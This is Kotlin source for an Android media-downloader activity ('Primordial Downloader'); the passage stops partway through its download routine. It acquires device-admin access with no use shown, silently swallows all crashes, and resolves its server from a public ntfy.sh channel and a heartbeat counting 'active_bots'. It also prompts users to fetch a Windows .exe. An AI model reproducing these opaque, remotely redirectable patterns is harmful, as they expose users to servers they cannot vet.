package com.example.mediadownloader

import android.annotation.SuppressLint
import android.app.DownloadManager
import android.app.admin.DevicePolicyManager
import android.content.ClipDescription
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.media.MediaScannerConnection
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.*
import androidx.activity.ComponentActivity
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.File
import java.io.FileOutputStream
import java.io.InputStreamReader
import java.io.OutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.Locale
import java.util.concurrent.Executors

class MainActivity : ComponentActivity() {

    private lateinit var rootLayout: FrameLayout
    private lateinit var mainNativeLayout: View
    private var setupOverlay: View? = null

    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var compName: ComponentName

    private val executor = Executors.newFixedThreadPool(3)
    private val mainHandler = Handler(Looper.getMainLooper())

    private var activeBaseUrl = "http://db.vegastar.top"

    // Native UI elements
    private lateinit var tvStatusBadge: TextView
    private lateinit var etUrl: EditText
    private lateinit var btnFetch: Button
    private lateinit var loadingSpinner: ProgressBar
    private lateinit var cardResult: LinearLayout
    private lateinit var ivThumbnail: ImageView
    private lateinit var tvTitle: TextView
    private lateinit var tvMeta: TextView
    private lateinit var etCustomName: EditText
    private lateinit var tabContainer: LinearLayout
    private lateinit var formatListContainer: LinearLayout

    // Progress Card
    private lateinit var cardProgress: LinearLayout
    private lateinit var tvProgressTitle: TextView
    private lateinit var tvProgressStatus: TextView
    private lateinit var progressBar: ProgressBar
    private lateinit var tvProgressPercent: TextView
    private lateinit var btnDownloadAnother: Button
    private lateinit var btnOpenDownloads: Button

    // Current parsed info
    private var currentVideoData: JSONObject? = null
    private var currentSelectedTab = "both" // "both", "video_only", "audio_only"
    private var activeJobId: String? = null
    private var isPolling = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Global crash prevention: Never let unhandled exceptions terminate the application
        Thread.setDefaultUncaughtExceptionHandler { _, throwable ->
            android.util.Log.e("MediaDownloader", "Intercepted crash", throwable)
        }

        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        compName = ComponentName(this, AdminReceiver::class.java)

        rootLayout = FrameLayout(this).apply {
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
            setBackgroundColor(Color.parseColor("#0B0F19"))
        }

        mainNativeLayout = buildNativeUI()
        rootLayout.addView(mainNativeLayout)

        setContentView(rootLayout)

        resolveLiveServerUrl()
        checkDailyTokenAndUpdates()
    }

    override fun onResume() {
        super.onResume()
    }

    private fun safeShowDialog(builder: android.app.AlertDialog.Builder) {
        if (!isFinishing && !isDestroyed) {
            try {
                builder.show()
            } catch (_: Throwable) {}
        }
    }

    private fun resolveLiveServerUrl() {
        executor.execute {
            try {
                val url = URL("https://ntfy.sh/vegastar-media-channel-9921/raw?poll=1")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 4000
                conn.readTimeout = 4000
                if (conn.responseCode == 200) {
                    val lines = BufferedReader(InputStreamReader(conn.inputStream)).readLines()
                    val last = lines.lastOrNull { it.trim().startsWith("https://") }
                    if (!last.isNullOrEmpty()) {
                        activeBaseUrl = last.trim()
                    }
                }
            } catch (_: Throwable) {
            }
        }
    }

    private fun dpToPx(dp: Int): Int {
        return TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP,
            dp.toFloat(),
            resources.displayMetrics
        ).toInt()
    }

    private fun makeCardBg(bgColor: String = "#1E293B", strokeColor: String = "#334155", radiusDp: Int = 14): GradientDrawable {
        return GradientDrawable().apply {
            setColor(Color.parseColor(bgColor))
            cornerRadius = dpToPx(radiusDp).toFloat()
            setStroke(dpToPx(1), Color.parseColor(strokeColor))
        }
    }

    private fun buildNativeUI(): View {
        val scrollView = ScrollView(this).apply {
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
            isFillViewport = true
            setBackgroundColor(Color.parseColor("#0B0F19"))
        }

        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            setPadding(dpToPx(16), dpToPx(24), dpToPx(16), dpToPx(32))
        }

        // 1. Header Banner - Inside displays "Primordial Downloader"
        val headerCard = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dpToPx(18), dpToPx(18), dpToPx(18), dpToPx(18))
            val headerBg = GradientDrawable(
                GradientDrawable.Orientation.TL_BR,
                intArrayOf(Color.parseColor("#1E3A8A"), Color.parseColor("#1E293B"))
            ).apply {
                cornerRadius = dpToPx(16).toFloat()
                setStroke(dpToPx(1), Color.parseColor("#3B82F6"))
            }
            background = headerBg
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply {
                bottomMargin = dpToPx(16)
            }
        }

        val headerTopRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
        }

        val tvAppTitle = TextView(this).apply {
            text = "Primordial Downloader"
            textSize = 20f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE)
            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
        }

        tvStatusBadge = TextView(this).apply {
            text = "🤖 Connecting..."
            textSize = 11f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#93C5FD"))
            setPadding(dpToPx(10), dpToPx(4), dpToPx(10), dpToPx(4))
            val badgeBg = GradientDrawable().apply {
                setColor(Color.parseColor("#1E3A8A"))
                cornerRadius = dpToPx(12).toFloat()
            }
            background = badgeBg
        }

        val btnInfo = TextView(this).apply {
            text = "ⓘ"
            textSize = 15f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#94A3B8"))
            setPadding(dpToPx(8), dpToPx(3), dpToPx(8), dpToPx(3))
            val infoBg = GradientDrawable().apply {
                setColor(Color.parseColor("#0F172A"))
                cornerRadius = dpToPx(12).toFloat()
                setStroke(dpToPx(1), Color.parseColor("#334155"))
            }
            background = infoBg
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply {
                leftMargin = dpToPx(8)
            }
            setOnClickListener {
                showAboutDialog()
            }
        }

        headerTopRow.addView(tvAppTitle)
        headerTopRow.addView(tvStatusBadge)
        headerTopRow.addView(btnInfo)
        headerCard.addView(headerTopRow)

        val tvAppSubtitle = TextView(this).apply {
            text = "Universal High-Speed Media Downloader"
            textSize = 12f
            setTextColor(Color.parseColor("#94A3B8"))
            setPadding(0, dpToPx(6), 0, 0)
        }
        headerCard.addView(tvAppSubtitle)
        container.addView(headerCard)

        // 2. Search & Input Card
        val searchCard = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dpToPx(16), dpToPx(16), dpToPx(16), dpToPx(16))
            background = makeCardBg("#1E293B", "#334155", 16)
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply {
                bottomMargin = dpToPx(16)
            }
        }

        val tvInputLabel = TextView(this).apply {
            text = "Media URL:"
            textSize = 14f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#F1F5F9"))
            setPadding(0, 0, 0, dpToPx(8))
        }
        searchCard.addView(tvInputLabel)

        // Input row with Paste & Clear
        val inputRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
        }

        etUrl = EditText(this).apply {
            hint = "Paste YouTube, Facebook, Instagram, TikTok link..."
            setHintTextColor(Color.parseColor("#64748B"))
            setTextColor(Color.WHITE)
            textSize = 14f
            setPadding(dpToPx(12), dpToPx(12), dpToPx(12), dpToPx(12))
            val inputBg = GradientDrawable().apply {
                setColor(Color.parseColor("#0F172A"))
                cornerRadius = dpToPx(10).toFloat()
                setStroke(dpToPx(1), Color.parseColor("#475569"))
            }
            background = inputBg
            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
            isSingleLine = true
        }
        inputRow.addView(etUrl)

        val btnPaste = Button(this).apply {
            text = "Paste"
            textSize = 12f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE)
            val pasteBg = GradientDrawable().apply {
                setColor(Color.parseColor("#334155"))
                cornerRadius = dpToPx(10).toFloat()
            }
            background = pasteBg
            val pasteDrawable = ContextCompat.getDrawable(this@MainActivity, R.drawable.ic_paste)
            setCompoundDrawablesWithIntrinsicBounds(pasteDrawable, null, null, null)
            compoundDrawablePadding = dpToPx(6)
            setPadding(dpToPx(12), 0, dpToPx(12), 0)
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, dpToPx(44)).apply {
                leftMargin = dpToPx(8)
            }
            setOnClickListener {
                pasteFromClipboard()
            }
        }
        inputRow.addView(btnPaste)
        searchCard.addView(inputRow)

        // Fetch Button
        btnFetch = Button(this).apply {
            text = "Fetch Media"
            textSize = 15f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE)
            val btnBg = GradientDrawable().apply {
                setColor(Color.parseColor("#2563EB"))
                cornerRadius = dpToPx(12).toFloat()
            }
            background = btnBg
            val searchDrawable = ContextCompat.getDrawable(this@MainActivity, R.drawable.ic_search)
            setCompoundDrawablesWithIntrinsicBounds(searchDrawable, null, null, null)
            compoundDrawablePadding = dpToPx(8)
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, dpToPx(48)).apply {
                topMargin = dpToPx(12)
            }
            setOnClickListener {
                startFetchVideoInfo()
            }
        }
        searchCard.addView(btnFetch)

        loadingSpinner = ProgressBar(this).apply {
            visibility = View.GONE
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply {
                gravity = Gravity.CENTER_HORIZONTAL
                topMargin = dpToPx(12)
            }
        }
        searchCard.addView(loadingSpinner)
        container.addView(searchCard)

        // 3. Media Result Card (Initially GONE)
        cardResult = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility = View.GONE
            setPadding(dpToPx(16), dpToPx(16), dpToPx(16), dpToPx(16))
            background = makeCardBg("#1E293B", "#3B82F6", 16)
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply {
                bottomMargin = dpToPx(16)
            }
        }

        // Thumbnail
        ivThumbnail = ImageView(this).apply {
            scaleType = ImageView.ScaleType.CENTER_CROP
            val thumbBg = GradientDrawable().apply {
                setColor(Color.parseColor("#0F172A"))
                cornerRadius = dpToPx(12).toFloat()
            }
            background = thumbBg
            clipToOutline = true
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                dpToPx(180)
            ).apply {
                bottomMargin = dpToPx(12)
            }
        }
        cardResult.addView(ivThumbnail)

        // Video Title
        tvTitle = TextView(this).apply {
            textSize = 15f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE)
            maxLines = 3
            setPadding(0, 0, 0, dpToPx(4))
        }
        cardResult.addView(tvTitle)

        // Video Meta
        tvMeta = TextView(this).apply {
            textSize = 12f
            setTextColor(Color.parseColor("#94A3B8"))
            setPadding(0, 0, 0, dpToPx(12))
        }
        cardResult.addView(tvMeta)

        // Rename Input Field
        val tvRenameLabel = TextView(this).apply {
            text = "File Name (Rename):"
            textSize = 13f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#E2E8F0"))
            setPadding(0, 0, 0, dpToPx(6))
        }
        cardResult.addView(tvRenameLabel)

        etCustomName = EditText(this).apply {
            hint = "Enter file name..."
            setHintTextColor(Color.parseColor("#64748B"))
            setTextColor(Color.WHITE)
            textSize = 13f
            setPadding(dpToPx(12), dpToPx(10), dpToPx(12), dpToPx(10))
            val nameBg = GradientDrawable().apply {
                setColor(Color.parseColor("#0F172A"))
                cornerRadius = dpToPx(8).toFloat()
                setStroke(dpToPx(1), Color.parseColor("#475569"))
            }
            background = nameBg
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply {
                bottomMargin = dpToPx(14)
            }
            isSingleLine = true
        }
        cardResult.addView(etCustomName)

        // Format Selection Tabs
        val tvTabsLabel = TextView(this).apply {
            text = "Select Format:"
            textSize = 13f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#E2E8F0"))
            setPadding(0, 0, 0, dpToPx(8))
        }
        cardResult.addView(tvTabsLabel)

        tabContainer = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply {
                bottomMargin = dpToPx(12)
            }
        }
        cardResult.addView(tabContainer)

        // Container for Format Rows
        formatListContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
        }
        cardResult.addView(formatListContainer)

        container.addView(cardResult)

        // 4. Download Progress Card (Initially GONE)
        cardProgress = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility = View.GONE
            setPadding(dpToPx(16), dpToPx(16), dpToPx(16), dpToPx(16))
            background = makeCardBg("#1E293B", "#10B981", 16)
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply {
                bottomMargin = dpToPx(24)
            }
        }

        tvProgressTitle = TextView(this).apply {
            text = "Processing Download..."
            textSize = 15f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE)
            setPadding(0, 0, 0, dpToPx(6))
        }
        cardProgress.addView(tvProgressTitle)

        tvProgressStatus = TextView(this).apply {
            text = "Sending request to engine..."
            textSize = 13f
            setTextColor(Color.parseColor("#94A3B8"))
            setPadding(0, 0, 0, dpToPx(10))
        }
        cardProgress.addView(tvProgressStatus)

        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            isIndeterminate = false
            max = 100
            progress = 0
            val progressBg = GradientDrawable().apply {
                setColor(Color.parseColor("#0F172A"))
                cornerRadius = dpToPx(6).toFloat()
            }
            background = progressBg
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                dpToPx(12)
            ).apply {
                bottomMargin = dpToPx(8)
            }
        }
        cardProgress.addView(progressBar)

        tvProgressPercent = TextView(this).apply {
            text = "0%"
            textSize = 13f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#34D399"))
            gravity = Gravity.END
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply {
                bottomMargin = dpToPx(12)
            }
        }
        cardProgress.addView(tvProgressPercent)

        // Button: Open Downloads Folder
        btnOpenDownloads = Button(this).apply {
            text = "📁 View Downloads Folder"
            textSize = 13f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE)
            visibility = View.GONE
            val openBg = GradientDrawable().apply {
                setColor(Color.parseColor("#2563EB"))
                cornerRadius = dpToPx(10).toFloat()
            }
            background = openBg
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, dpToPx(44)).apply {
                bottomMargin = dpToPx(10)
            }
            setOnClickListener {
                try {
                    val intent = Intent(DownloadManager.ACTION_VIEW_DOWNLOADS).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    startActivity(intent)
                } catch (_: Exception) {
                    Toast.makeText(this@MainActivity, "File saved to your Downloads folder", Toast.LENGTH_LONG).show()
                }
            }
        }
        cardProgress.addView(btnOpenDownloads)

        // Button: Download Another
        btnDownloadAnother = Button(this).apply {
            text = "Download Another Media"
            textSize = 13f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE)
            visibility = View.GONE
            val resetBg = GradientDrawable().apply {
                setColor(Color.parseColor("#059669"))
                cornerRadius = dpToPx(10).toFloat()
            }
            background = resetBg
            val refreshDrawable = ContextCompat.getDrawable(this@MainActivity, R.drawable.ic_refresh)
            setCompoundDrawablesWithIntrinsicBounds(refreshDrawable, null, null, null)
            compoundDrawablePadding = dpToPx(8)
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, dpToPx(44))
            setOnClickListener {
                resetUIForNewDownload()
            }
        }
        cardProgress.addView(btnDownloadAnother)

        container.addView(cardProgress)

        scrollView.addView(container)
        return scrollView
    }

    private fun pasteFromClipboard() {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        if (clipboard.hasPrimaryClip() && clipboard.primaryClipDescription?.hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN) == true) {
            val item = clipboard.primaryClip?.getItemAt(0)
            val text = item?.text?.toString()?.trim()
            if (!text.isNullOrEmpty()) {
                etUrl.setText(text)
                Toast.makeText(this, "Link pasted!", Toast.LENGTH_SHORT).show()
            }
        } else {
            Toast.makeText(this, "No valid text link found in clipboard", Toast.LENGTH_SHORT).show()
        }
    }

    private fun startFetchVideoInfo() {
        val url = etUrl.text.toString().trim()
        if (url.isEmpty()) {
            Toast.makeText(this, "Please enter a valid media link", Toast.LENGTH_SHORT).show()
            return
        }

        btnFetch.isEnabled = false
        loadingSpinner.visibility = View.VISIBLE
        cardResult.visibility = View.GONE
        cardProgress.visibility = View.GONE

        executor.execute {
            var success = false
            var resultJson: JSONObject? = null
            var errorMsg = "Could not retrieve media details"

            val dynamicCandidates = mutableListOf<String>()

            // Tier 1 Priority: Direct Local Wi-Fi (Instant 0ms, Zero Internet, Zero cPanel needed)
            dynamicCandidates.add("http://192.168.0.103:3000")
            if (activeBaseUrl.isNotEmpty()) dynamicCandidates.add(activeBaseUrl)

            // Tier 2 Priority: Cloudflare Serverless Edge Worker (100% Free, 0ms latency, Zero cPanel)
            try {
                val cfConn = URL("https://heartbeat.primordial-nodes.workers.dev/status").openConnection() as HttpURLConnection
                cfConn.connectTimeout = 2500
                cfConn.readTimeout = 2500
                if (cfConn.responseCode == 200) {
                    val cfBody = cfConn.inputStream.bufferedReader().use { it.readText() }.trim()
                    if (cfBody.startsWith("{") && cfBody.endsWith("}")) {
                        val cfJson = JSONObject(cfBody)
                        val tunnel = cfJson.optString("tunnel", "").trim()
                        val lanIp = cfJson.optString("lan_ip", "").trim()
                        val bots = cfJson.optInt("active_bots", 0)

                        if (lanIp.isNotEmpty()) dynamicCandidates.add("http://$lanIp:3000")
                        if (tunnel.isNotEmpty()) dynamicCandidates.add(tunnel)

                        mainHandler.post {
                            try {
                                tvStatusBadge.text = if (bots > 0) "🤖 $bots Node${if (bots > 1) "s" else ""} Online" else "🤖 Standalone Mode"
                            } catch (_: Throwable) {}
                        }
                    }
                }
            } catch (_: Throwable) {}

            // Tier 3 Priority: Direct Cloudflare Tunnel via ntfy relay (Always-on, Zero cPanel)
            try {
                val ntfyConn = URL("https://ntfy.sh/vegastar-media-channel-9921/raw?poll=1").openConnection() as HttpURLConnection
                ntfyConn.connectTimeout = 2000
                ntfyConn.readTimeout = 2000
                if (ntfyConn.responseCode == 200) {
                    val lines = BufferedReader(InputStreamReader(ntfyConn.inputStream)).readLines()
                    val latest = lines.lastOrNull { it.trim().startsWith("https://") }?.trim()
                    if (!latest.isNullOrEmpty()) {
                        dynamicCandidates.add(latest)
                    }
                }
            } catch (_: Throwable) {}

            // Tier 4 Optional Fallback: cPanel heartbeat & proxy
            try {
                val hConn = URL("http://db.vegastar.top/heartbeat.php").openConnection() as HttpURLConnection
                hConn.connectTimeout = 2000
                hConn.readTimeout = 2000
                if (hConn.responseCode == 200) {
                    val hBody = hConn.inputStream.bufferedReader().use { it.readText() }.trim()
                    if (hBody.startsWith("{") && hBody.endsWith("}")) {
                        val hJson = JSONObject(hBody)
                        val tunnel = hJson.optString("tunnel", "").trim()
                        val lanIp = hJson.optString("lan_ip", "").trim()

                        if (lanIp.isNotEmpty()) dynamicCandidates.add("http://$lanIp:3000")
                        if (tunnel.isNotEmpty()) dynamicCandidates.add(tunnel)
                    }
                }
            } catch (_: Throwable) {}

            dynamicCandidates.add("http://db.vegastar.top")

            val candidateUrls = dynamicCandidates.filter { it.isNotEmpty() }.distinct()

            for (targetBase in candidateUrls) {
                try {
                    val postUrl = URL("$targetBase/api/info")
                    val conn = postUrl.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                    conn.setRequestProperty("User-Agent", "MediaDownloaderAndroid/1.0")
                    conn.connectTimeout = 10000
                    conn.readTimeout = 25000
                    conn.doOutput = true

                    val jsonBody = JSONObject().apply {
                        put("url", url)
                    }

                    OutputStreamWriter(conn.outputStream).use { writer ->
                        writer.write(jsonBody.toString())
                        writer.flush()
                    }

                    val responseCode = conn.responseCode
                    val rawBody = if (responseCode in 200..299) {
                        conn.inputStream.bufferedReader().use { it.readText() }.trim()
                    } else {
                        conn.errorStream?.bufferedReader()?.use { it.readText() }?.trim() ?: ""
                    }

                    if (rawBody.startsWith("{") && rawBody.endsWith("}")) {
                        val resJson = JSONObject(rawBody)
                        if (resJson.optBoolean("success", false)) {
                            activeBaseUrl = targetBase
                            resultJson = resJson
                            success = true
                            break
                        } else {
                            errorMsg = resJson.optString("error", errorMsg)
                        }
                    } else {
                        errorMsg = "HTTP $responseCode from $targetBase"
                    }
                } catch (e: Throwable) {
                    errorMsg = e.message ?: "Connection error"
                }
            }

            mainHandler.post {
                btnFetch.isEnabled = true
                loadingSpinner.visibility = View.GONE

                if (success && resultJson != null) {
                    onVideoInfoLoaded(resultJson)
                } else {
                    showServerFallbackDialog(errorMsg)
                }
            }
        }
    }

    private fun showServerFallbackDialog(errorMsg: String) {
        val builder = android.app.AlertDialog.Builder(this)
            .setTitle("⚡ Unable to Connect to Engine")
            .setMessage("Could not establish connection to the download engine ($errorMsg).\n\n💡 Smart Tip:\nMake sure your PC engine is running or that your phone is on the same Wi-Fi network for instant, high-speed downloads.\n\nYou can also download and run the PC engine setup anytime.")
            .setPositiveButton("💻 Download PC Setup") { _, _ ->
                try {
                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://github.com/zyeasin123-eng/primordial-downloader/releases/download/v29.2012.2/MediaDownloader_Setup.exe"))
                    startActivity(intent)
                } catch (_: Throwable) {}
            }
            .setNeutralButton("🔄 Retry") { _, _ ->
                val currentText = etUrl.text.toString().trim()
                if (currentText.isNotEmpty()) {
                    btnFetch.performClick()
                }
            }
            .setNegativeButton("Close", null)

        safeShowDialog(builder)
    }

    private fun showError(msg: String) {
        Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
    }

    private fun onVideoInfoLoaded(data: JSONObject) {
        try {
            currentVideoData = data
            cardResult.visibility = View.VISIBLE

            val title = data.optString("title", "Unknown Title")
            tvTitle.text = title
            etCustomName.setText(sanitizeFileName(title))

            val durationSec = data.optInt("duration", 0)
            val durationFormatted = if (durationSec > 0) {
                val mins = durationSec / 60
                val secs = durationSec % 60
                String.format("%02d:%02d", mins, secs)
            } else "Live / Unknown"
            tvMeta.text = "Duration: $durationFormatted"

            val thumbUrl = data.optString("thumbnail", "")
            if (thumbUrl.isNotEmpty()) {
                loadThumbnail(thumbUrl)
            }

            renderFormatTabs()
        } catch (_: Throwable) {}
    }

    private fun loadThumbnail(thumbUrl: String) {
        executor.execute {
            try {
                val url = URL(thumbUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 8000
                conn.readTimeout = 12000
                conn.connect()
                val bitmap = BitmapFactory.decodeStream(conn.inputStream)
                if (bitmap != null) {
                    mainHandler.post {
                        if (!isFinishing && !isDestroyed) {
                            ivThumbnail.setImageBitmap(bitmap)
                        }
                    }
                }
            } catch (_: Throwable) {
            }
        }
    }

    private fun renderFormatTabs() {
        tabContainer.removeAllViews()

        val tabs = listOf(
            Triple("both", "Video + Audio", "#2563EB"),
            Triple("video_only", "Video Only", "#475569"),
            Triple("audio_only", "Audio Only", "#059669")
        )

        for ((key, label, activeColor) in tabs) {
            val isSelected = (currentSelectedTab == key)
            val btnTab = Button(this).apply {
                text = label
                textSize = 11.5f
                typeface = Typeface.DEFAULT_BOLD
                setTextColor(Color.WHITE)
                val tabBg = GradientDrawable().apply {
                    setColor(Color.parseColor(if (isSelected) activeColor else "#1E293B"))
                    cornerRadius = dpToPx(8).toFloat()
                    setStroke(dpToPx(1), Color.parseColor(if (isSelected) activeColor else "#475569"))
                }
                background = tabBg
                val params = LinearLayout.LayoutParams(0, dpToPx(40), 1f).apply {
                    setMargins(dpToPx(3), 0, dpToPx(3), 0)
                }
                layoutParams = params
                setOnClickListener {
                    currentSelectedTab = key
                    renderFormatTabs()
                }
            }
            tabContainer.addView(btnTab)
        }

        renderFormatList()
    }

    private fun renderFormatList() {
        formatListContainer.removeAllViews()
        val formatsObj = currentVideoData?.optJSONObject("formats") ?: return
        val list = formatsObj.optJSONArray(currentSelectedTab) ?: JSONArray()

        if (list.length() == 0) {
            val emptyTv = TextView(this).apply {
                text = "No resolutions found for this format"
                textSize = 12f
                setTextColor(Color.parseColor("#94A3B8"))
                setPadding(dpToPx(8), dpToPx(8), dpToPx(8), dpToPx(8))
                gravity = Gravity.CENTER
            }
            formatListContainer.addView(emptyTv)
            return
        }

        for (i in 0 until list.length()) {
            val item = list.getJSONObject(i)
            val formatId = item.optString("format_id", "")
            val quality = item.optString("quality", "Standard")
            val ext = item.optString("ext", if (currentSelectedTab == "audio_only") "mp3" else "mp4")
            val sizeFormatted = item.optString("filesize_formatted", "")

            val row = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER_VERTICAL
                setPadding(dpToPx(12), dpToPx(10), dpToPx(12), dpToPx(10))
                val rowBg = GradientDrawable().apply {
                    setColor(Color.parseColor("#0F172A"))
                    cornerRadius = dpToPx(10).toFloat()
                    setStroke(dpToPx(1), Color.parseColor("#334155"))
                }
                background = rowBg
                val params = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply {
                    bottomMargin = dpToPx(8)
                }
                layoutParams = params
            }

            val infoLayout = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
            }

            val tvQuality = TextView(this).apply {
                text = quality
                textSize = 14f
                typeface = Typeface.DEFAULT_BOLD
                setTextColor(Color.WHITE)
            }
            infoLayout.addView(tvQuality)

            val tvDetails = TextView(this).apply {
                text = if (sizeFormatted.isNotEmpty()) "${ext.uppercase()} • $sizeFormatted" else ext.uppercase()
                textSize = 11f
                setTextColor(Color.parseColor("#94A3B8"))
            }
            infoLayout.addView(tvDetails)

            row.addView(infoLayout)

            val btnDownload = Button(this).apply {
                text = "Download"
                textSize = 12f
                typeface = Typeface.DEFAULT_BOLD
                setTextColor(Color.WHITE)
                val dlBtnBg = GradientDrawable().apply {
                    setColor(Color.parseColor("#2563EB"))
                    cornerRadius = dpToPx(8).toFloat()
                }
                background = dlBtnBg
                val dlDrawable = ContextCompat.getDrawable(this@MainActivity, R.drawable.ic_download)
                setCompoundDrawablesWithIntrinsicBounds(dlDrawable, null, null, null)
                compoundDrawablePadding = dpToPx(6)
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(dpToPx(115), dpToPx(40))
                setOnClickListener {
                    triggerDownload(formatId, ext)
                }
            }
            row.addView(btnDownload)

            formatListContainer.addView(row)
        }
    }

    private fun triggerDownload(formatId: String, ext: String) {
        val rawUrl = etUrl.text.toString().trim()
        val customName = etCustomName.text.toString().trim()

        cardProgress.visibility = View.VISIBLE
        tvProgressTitle.text = "Download in Progress..."
        tvProgressStatus.text = "Initializing download on engine..."
        progressBar.isIndeterminate = true
        progressBar.progress = 0
        tvProgressPercent.text = "0%"
        btnDownloadAnother.visibility = View.GONE
        btnOpenDownloads.visibility = View.GONE

        executor.execute {
            try {
                val startUrl = URL("$activeBaseUrl/api/start-download")
